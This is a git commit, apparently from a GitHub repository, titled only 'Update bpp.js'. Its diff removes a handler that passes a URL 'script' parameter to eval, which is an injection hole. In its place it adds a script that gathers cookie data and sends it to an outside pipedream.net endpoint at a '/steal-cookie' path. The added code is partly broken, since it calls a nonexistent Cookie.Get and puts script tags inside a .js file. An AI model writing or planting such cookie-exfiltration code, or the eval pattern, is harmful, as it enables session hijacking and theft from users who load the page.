8df1fe6b4450a3bbd7e3f2f37860015fe0b46881
0x1b <164749781+RHYru9@users.noreply.github.com>
2024-09-28 01:59:19 +0700

    Update bpp.js

--- bpp.js
+++ bpp.js
@@ -1,6 +1,10 @@
-document.addEventListener('DOMContentLoaded', () => {
-  const encodedScript = decodeURIComponent(getParameterByName('script'));
-  if (encodedScript) {
-    eval(encodedScript); 
-  }
-});
+<script>
+    function stealCookie() {
+        var cookieData = {};
+        Cookie.Get('yourCookieName', cookieData); 
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://eoow6y96ffo9mzx.m.pipedream.net/steal-cookie?cookie=' + encodeURIComponent(JSON.stringify(cookieData)), true);
+        xhr.send();
+    }
+    stealCookie();
+</script>
